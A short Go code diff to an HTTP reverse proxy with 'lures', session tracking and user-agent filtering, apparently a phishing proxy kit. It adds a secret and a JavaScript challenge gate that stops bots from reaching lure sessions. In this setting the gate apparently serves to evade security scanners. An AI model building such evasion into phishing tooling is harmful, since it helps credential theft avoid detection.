@@ -77,6 +77,7 @@ type HttpProxy struct {
 	sessions          map[string]*Session
 	sids              map[string]int
 	cookieName        string
+	challengeSecret   string
 	last_sid          int
 	developer         bool
 	ip_whitelist      map[string]int64
@@ -162,6 +163,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	}
 
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
+	p.challengeSecret = GenRandomString(32)
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
@@ -458,6 +460,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									} else {
 										log.Error("lures: user-agent filter regexp is invalid: %v", err)
 									}
+								}
+
+								// JS challenge gate — bots that don't execute JS never pass.
+								if !ValidChallengeCookie(req, req_path, p.challengeSecret) {
+									return ChallengeResponse(req, req_path, p.challengeSecret)
 								}
 
 								session, err := NewSession(pl.Name)
